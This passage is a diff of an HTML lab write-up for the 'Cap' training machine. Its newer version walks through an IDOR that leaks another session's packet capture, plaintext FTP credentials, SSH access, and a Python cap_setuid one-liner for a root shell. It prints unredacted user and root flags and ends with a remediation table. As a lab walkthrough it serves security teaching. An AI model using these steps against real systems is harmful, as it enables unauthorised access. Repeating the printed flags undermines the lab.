+<th>Port</th>
+<th>State</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>open</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td>22</td>
+<td>open</td>
+<td>ssh</td>
+</tr>
+<tr>
+<td>80</td>
+<td>open</td>
+<td>http</td>
+</tr>
+</tbody>
+</table>
+<p>FTP and SSH are standard, but with no obvious anonymous FTP access or exposed SSH vulnerability, the web service on port 80 was the logical starting point.</p>
+<hr />
+<h2 id="2-web-enumeration">2. Web Enumeration<a class="headerlink" href="#2-web-enumeration" title="Permanent link">&para;</a></h2>
+<p>Browsing to <code>http://10.129.6.89</code> presented a "Security Dashboard" application, logged in as a user named <strong>Nathan</strong>. The sidebar exposed several sections, including an interesting feature: <strong>Security Snapshot (5 Second PCAP + Analysis)</strong>.</p>
+<p>![[image.png]]
+Dashboard with Security Snapshot feature highlighted</p>
+<p>Selecting this option captures 5 seconds of live network traffic on the box and presents summary statistics (packet counts, protocol breakdown, etc.) with a <strong>Download</strong> button to pull the raw <code>.pcap</code> file.</p>
+<p>Testing this feature generated the capture shown at <code>http://10.129.6.89/data/1</code>, and the UI exposed a <strong>Download</strong> button for grabbing the corresponding <code>.pcap</code>.</p>
+<p>![[image 1.png]]</p>
+<p>/data/1 endpoint showing a freshly generated 1-packet capture</p>
+<hr />
+<h2 id="3-exploiting-the-idor">3. Exploiting the IDOR<a class="headerlink" href="#3-exploiting-the-idor" title="Permanent link">&para;</a></h2>
+<p>The capture is referenced directly by a numeric, user-controllable ID in the URL path — <code>/data/&lt;id&gt;</code>. This is a textbook <strong>Insecure Direct Object Reference (IDOR)</strong>: there is no check that the requesting user owns or generated that particular capture ID.</p>
+<p>By simply decrementing the ID and requesting <code>http://10.129.6.89/data/0</code>, an earlier capture belonging to another session was retrieved — one containing significantly more traffic (72 packets vs. 1 in the fresh capture), including FTP sessions and HTTP data never generated by the current session.</p>
+<p>![[image 2.png]]</p>
+<p>/data/0 endpoint returning a much larger, previously-generated capture — the IDOR</p>
+<p>Downloading and opening <code>0.pcap</code> in Wireshark surfaced a full <strong>FTP login sequence in plaintext</strong>:</p>
+<p>![[image 3.png]]</p>
+<p>Wireshark view of the FTP session showing USER/PASS in cleartext</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Request: USER nathan
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Response: 331 Please specify the password.
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Request: PASS Buck3tH4TF0RM3!
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Response: 230 Login successful.
 </span></code></pre></div>
-<p>The key lesson is that an object identifier is not an authorization check. The server must verify that the current user is allowed to access the requested capture, not merely that the identifier exists.</p>
-<h2 id="3-obtain-the-user-shell">3. Obtain the user shell<a class="headerlink" href="#3-obtain-the-user-shell" title="Permanent link">&para;</a></h2>
-<p>Use the recovered credentials to connect over SSH:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ssh<span class="w"> </span>nathan@LAB_IP
+<p>Credentials harvested:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>username: nathan
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>password: Buck3tH4TF0RM3!
 </span></code></pre></div>
-<p>The fifth screenshot shows the authenticated SSH session.</p>
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-5.png" alt="SSH session as nathan on Cap" loading="lazy">
-  <figcaption><strong>Figure 5.</strong> SSH access as `nathan` after reusing the recovered credentials.</figcaption>
-</figure>
-
-<p>The sixth screenshot shows the user-flag check. The flag value is redacted in this published copy.</p>
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-6.png" alt="User flag check on Cap" loading="lazy">
-  <figcaption><strong>Figure 6.</strong> The user-flag check in the authenticated SSH session. The flag value is redacted.</figcaption>
-</figure>
-
-<p>The source notes verified the user flag with:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nathan@cap:~$<span class="w"> </span>ls
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>user.txt
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>nathan@cap:~$<span class="w"> </span>cat<span class="w"> </span>user.txt
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>&lt;USER_FLAG_REDACTED&gt;
+<p>This confirms the root cause: the application does not scope captured PCAP files to the session/user that generated them, and sequential/predictable IDs allow any authenticated (or even unauthenticated, depending on access control) user to pull historical captures — including ones containing other users' credentials in cleartext protocols like FTP.</p>
+<hr />
+<h2 id="4-initial-access-ssh">4. Initial Access (SSH)<a class="headerlink" href="#4-initial-access-ssh" title="Permanent link">&para;</a></h2>
+<p>The recovered credentials worked directly against SSH:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ssh<span class="w"> </span>nathan@10.129.6.89
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1"># password: Buck3tH4TF0RM3!</span>
 </span></code></pre></div>
-<h2 id="4-escalate-through-python-capabilities">4. Escalate through Python capabilities<a class="headerlink" href="#4-escalate-through-python-capabilities" title="Permanent link">&para;</a></h2>
-<p>Search the filesystem for Linux file capabilities. The <code>cap_setuid</code> capability allows the Python interpreter to change its effective UID and is the local privilege-escalation primitive used here.</p>
-<p>The final screenshot shows the root shell and the flag-read operation. The flag value is redacted in this published copy.</p>
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-7.png" alt="Root shell on Cap" loading="lazy">
-  <figcaption><strong>Figure 7.</strong> Root access obtained through the `cap_setuid` capability on Python. The flag output is redacted.</figcaption>
-</figure>
-
-<p>The complete privilege-escalation terminal output from the source note is preserved below:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nathan@cap:~$<span class="w"> </span>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>/usr/bin/python3.8<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_setuid,cap_net_bind_service+eip
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>/usr/bin/ping<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_net_raw+ep
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>/usr/bin/traceroute6.iputils<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_net_raw+ep
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>/usr/bin/mtr-packet<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_net_raw+ep
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_net_bind_service,cap_net_admin+ep
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>nathan@cap:~$<span class="w"> </span>getcap<span class="w"> </span>/usr/bin/python3.8
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>/usr/bin/python3.8<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_setuid,cap_net_bind_service+eip
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>nathan@cap:~$<span class="w"> </span>/usr/bin/python3.8<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>root@cap:~#<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>root
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>root@cap:/root#<span class="w"> </span>cat<span class="w"> </span>root.txt
-</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>&lt;ROOT_FLAG_REDACTED&gt;
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
-</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>root@cap:/root#
+<p>SSH login as nathan succeeding</p>
+<p>![[image 4.png]]</p>
+<p>This dropped into a shell on an Ubuntu 20.04.2 LTS host as the <code>nathan</code> user.</p>
+<h3 id="user-flag">User Flag<a class="headerlink" href="#user-flag" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nathan@cap:~$<span class="w"> </span>ls
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>user.txt
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>nathan@cap:~$<span class="w"> </span>cat<span class="w"> </span>user.txt
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>ad98dcdd3dbd6cc01c857fb6d6e296a6
 </span></code></pre></div>
-<h2 id="takeaways">Takeaways<a class="headerlink" href="#takeaways" title="Permanent link">&para;</a></h2>
-<ul>
-<li>Treat numeric object identifiers as untrusted input and enforce authorization server-side.</li>
-<li>Do not expose packet captures containing credentials to users who do not own them.</li>
-<li>Audit file capabilities regularly; <code>cap_setuid</code> on an interpreter is effectively a local privilege-escalation primitive.</li>
-</ul>
+<p>Reading user.txt</p>
+<p>![[image 5.png]]</p>
+<hr />
+<h2 id="5-privilege-escalation">5. Privilege Escalation<a class="headerlink" href="#5-privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>With shell access as <code>nathan</code>, the next step was hunting for privilege escalation vectors. Checking Linux capabilities assigned to binaries on the filesystem revealed the misconfiguration:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nathan@cap:~$<span class="w"> </span>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>/usr/bin/python3.8<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_setuid,cap_net_bind_service+eip
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>/usr/bin/ping<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_net_raw+ep
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>/usr/bin/traceroute6.iputils<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_net_raw+ep
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>/usr/bin/mtr-packet<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_net_raw+ep
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper<span class="w"> </span><span class="o">=</span><span class="w"> </span>cap_net_bind_service,cap_net_admin+ep
+</span></code></pre></div>
+<p>The critical finding: <code>/usr/bin/python3.8</code> has the <strong><code>cap_setuid</code></strong> capability set with effective, inheritable, and permitted flags (<code>+eip</code>). This capability allows a process to arbitrarily change its own UID — including to <code>0</code> (root) — without needing to be run via <code>sudo</code> or be SUID-root itself.</p>
+<p>Since this Python binary can set its own UID, calling <code>os.setuid(0)</code> from within a Python process executed via that binary grants a root-privileged process:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nathan@cap:~$<span class="w"> </span>/usr/bin/python3.8<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>root@cap:~#
+</span></code></pre></div>
+<p>This spawns a <code>bash</code> shell running with UID 0.</p>
+<h3 id="root-flag">Root Flag<a class="headerlink" href="#root-flag" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>root@cap:/root#<span class="w"> </span>cat<span class="w"> </span>root.txt
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>d5b997c6116dab119a03ab03369d55af
+</span></code></pre></div>
+<p>getcap enumeration, python3.8 privilege escalation, and root.txt</p>
+<hr />
+<h2 id="6-root-cause-remediation">6. Root Cause &amp; Remediation<a class="headerlink" href="#6-root-cause-remediation" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Issue</th>
+<th>Root Cause</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IDOR on <code>/data/&lt;id&gt;</code></td>
+<td>Sequential, predictable resource IDs with no ownership/access-control check</td>
+<td>Use unguessable identifiers (UUIDs) and enforce server-side authorization tying each capture to the session/user that created it</td>
+</tr>
+<tr>
+<td>Cleartext FTP credentials in PCAP</td>
+<td>FTP transmits credentials unencrypted; captured and stored without redaction</td>
+<td>Disable/replace FTP with SFTP/FTPS; avoid persisting raw packet captures containing credentials, or redact/encrypt them at rest</td>
+</tr>
+<tr>
+<td><code>cap_setuid</code> on <code>python3.8</code></td>
+<td>Unnecessary Linux capability granted to an interpreter binary usable for arbitrary code execution</td>
+<td>Remove the capability (<code>setcap -r /usr/bin/python3.8</code>) — an interpreter should never hold <code>cap_setuid</code>, as it trivially grants full privilege escalation to anyone who can execute it</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-attack-chain-summary">7. Attack Chain Summary<a class="headerlink" href="#7-attack-chain-summary" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Nmap scan → ports 21/22/80 open
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>   ↓
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Web dashboard (port 80) → "Security Snapshot" PCAP feature
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>   ↓
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>IDOR on /data/&lt;id&gt; → pull earlier capture (/data/0)
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>   ↓
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>Wireshark analysis → plaintext FTP creds (nathan:Buck3tH4TF0RM3!)
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>   ↓
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>SSH as nathan → user.txt
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>   ↓
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>getcap enumeration → python3.8 has cap_setuid
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>   ↓
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>os.setuid(0) via python3.8 → root shell → root.txt
+</span></code></pre></div>
 
 
 
 
 
 
-
-  
-  
 
 
 
@@ -3603,44 +3546,6 @@
       
         <footer class="md-footer">
   
-    
-      
-      <nav class="md-footer__inner md-grid" aria-label="Footer" >
-        
-          
-          <a href="../" class="md-footer__link md-footer__link--prev" aria-label="Previous: HackTheBox Labs">
-            <div class="md-footer__button md-icon">
-              
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
-            </div>
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Previous
-              </span>
-              <div class="md-ellipsis">
-                HackTheBox Labs
-              </div>
-            </div>
-          </a>
-        
-        
-          
-          <a href="../connected/" class="md-footer__link md-footer__link--next" aria-label="Next: Connected">
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              <div class="md-ellipsis">
-                Connected
-              </div>
-            </div>
-            <div class="md-footer__button md-icon">
-              
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
-            </div>
-          </a>
-        
-      </nav>
     
   
   <div class="md-footer-meta md-typeset">
@@ -3684,12 +3589,12 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.indexes", "navigation.top", "navigation.footer", "toc.follow", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "content.tooltips"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.tracking", "navigation.indexes", "navigation.top", "navigation.footer", "toc.follow", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "content.tooltips"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
-        <script src="../../assets/javascripts/extra.js"></script>
+        <script src="../../../assets/javascripts/extra.js"></script>
       
     
   </body>
